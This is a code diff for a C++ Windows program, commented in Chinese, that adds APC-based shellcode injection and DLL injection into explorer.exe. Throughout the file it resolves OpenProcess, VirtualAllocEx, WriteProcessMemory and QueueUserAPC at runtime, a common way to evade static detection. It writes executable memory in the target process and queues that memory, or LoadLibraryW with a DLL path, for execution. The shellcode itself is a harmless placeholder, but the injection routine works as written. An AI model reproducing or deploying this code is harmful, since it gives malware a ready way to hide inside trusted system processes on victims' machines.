@@ -33,7 +33,7 @@ DWORD GetFirstThreadIdByPid(DWORD pid) {
     return 0;
 }
 
-int main() {
+void ShellcodeInjection() {
     // 动态获取API
     pOpenProcess MyOpenProcess = (pOpenProcess)SafeGetProcAddress(L"kernel32.dll", "OpenProcess");
     pVirtualAllocEx MyVirtualAllocEx = (pVirtualAllocEx)SafeGetProcAddress(L"kernel32.dll", "VirtualAllocEx");
@@ -43,46 +43,111 @@ int main() {
 
     if (!MyOpenProcess || !MyVirtualAllocEx || !MyWriteProcessMemory || !MyOpenThread || !MyQueueUserAPC) {
         std::cout << "动态API获取失败" << std::endl;
-        return -1;
+        return;
     }
 
     DWORD pid = GetProcessIdByName(L"explorer.exe");
     if (!pid) {
         std::cout << "未找到目标进程" << std::endl;
-        return -1;
+        return;
     }
     HANDLE hProcess = MyOpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
     if (!hProcess) {
         std::cout << "打开进程失败" << std::endl;
-        return -1;
+        return;
     }
     char shellcode[] = {0x90, 0x90, 0xC3}; // 示例shellcode
     LPVOID remoteAddr = MyVirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (!remoteAddr) {
         std::cout << "分配内存失败" << std::endl;
         CloseHandle(hProcess);
-        return -1;
+        return;
     }
     if (!MyWriteProcessMemory(hProcess, remoteAddr, shellcode, sizeof(shellcode), NULL)) {
         std::cout << "写入内存失败" << std::endl;
         CloseHandle(hProcess);
-        return -1;
+        return;
     }
     DWORD tid = GetFirstThreadIdByPid(pid);
     if (!tid) {
         std::cout << "未找到线程" << std::endl;
         CloseHandle(hProcess);
-        return -1;
+        return;
     }
     HANDLE hThread = MyOpenThread(THREAD_ALL_ACCESS, FALSE, tid);
     if (!hThread) {
         std::cout << "打开线程失败" << std::endl;
         CloseHandle(hProcess);
-        return -1;
+        return;
     }
     MyQueueUserAPC((PAPCFUNC)remoteAddr, hThread, NULL);
     CloseHandle(hThread);
     CloseHandle(hProcess);
     std::cout << "APC注入完成" << std::endl;
+}
+
+void DllInjection() {
+    typedef HANDLE (WINAPI* pOpenProcess)(DWORD, BOOL, DWORD);
+    typedef LPVOID (WINAPI* pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
+    typedef BOOL (WINAPI* pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
+    typedef HANDLE (WINAPI* pOpenThread)(DWORD, BOOL, DWORD);
+    typedef DWORD (WINAPI* pQueueUserAPC)(PAPCFUNC, HANDLE, ULONG_PTR);
+
+    pOpenProcess MyOpenProcess = (pOpenProcess)SafeGetProcAddress(L"kernel32.dll", "OpenProcess");
+    pVirtualAllocEx MyVirtualAllocEx = (pVirtualAllocEx)SafeGetProcAddress(L"kernel32.dll", "VirtualAllocEx");
+    pWriteProcessMemory MyWriteProcessMemory = (pWriteProcessMemory)SafeGetProcAddress(L"kernel32.dll", "WriteProcessMemory");
+    pOpenThread MyOpenThread = (pOpenThread)SafeGetProcAddress(L"kernel32.dll", "OpenThread");
+    pQueueUserAPC MyQueueUserAPC = (pQueueUserAPC)SafeGetProcAddress(L"kernel32.dll", "QueueUserAPC");
+    FARPROC MyLoadLibraryW = SafeGetProcAddress(L"kernel32.dll", "LoadLibraryW");
+
+    if (!MyOpenProcess || !MyVirtualAllocEx || !MyWriteProcessMemory || !MyOpenThread || !MyQueueUserAPC || !MyLoadLibraryW) {
+        std::cout << "动态API获取失败" << std::endl;
+        return;
+    }
+
+    DWORD pid = GetProcessIdByName(L"explorer.exe");
+    if (!pid) {
+        std::cout << "未找到目标进程" << std::endl;
+        return;
+    }
+    HANDLE hProcess = MyOpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    if (!hProcess) {
+        std::cout << "打开进程失败" << std::endl;
+        return;
+    }
+    wchar_t dllPath[] = L"C:\\test.dll";
+    SIZE_T dllPathSize = (wcslen(dllPath) + 1) * sizeof(wchar_t);
+    LPVOID remoteAddr = MyVirtualAllocEx(hProcess, NULL, dllPathSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!remoteAddr) {
+        std::cout << "分配内存失败" << std::endl;
+        CloseHandle(hProcess);
+        return;
+    }
+    if (!MyWriteProcessMemory(hProcess, remoteAddr, dllPath, dllPathSize, NULL)) {
+        std::cout << "写入内存失败" << std::endl;
+        CloseHandle(hProcess);
+        return;
+    }
+    DWORD tid = GetFirstThreadIdByPid(pid);
+    if (!tid) {
+        std::cout << "未找到线程" << std::endl;
+        CloseHandle(hProcess);
+        return;
+    }
+    HANDLE hThread = MyOpenThread(THREAD_ALL_ACCESS, FALSE, tid);
+    if (!hThread) {
+        std::cout << "打开线程失败" << std::endl;
+        CloseHandle(hProcess);
+        return;
+    }
+    MyQueueUserAPC((PAPCFUNC)MyLoadLibraryW, hThread, (ULONG_PTR)remoteAddr);
+    CloseHandle(hThread);
+    CloseHandle(hProcess);
+    std::cout << "DLL注入完成" << std::endl;
+}
+
+int main() {
+    //ShellcodeInjection(); // 如需shellcode注入，取消注释
+    DllInjection(); // 如需DLL注入，取消注释
     return 0;
 }
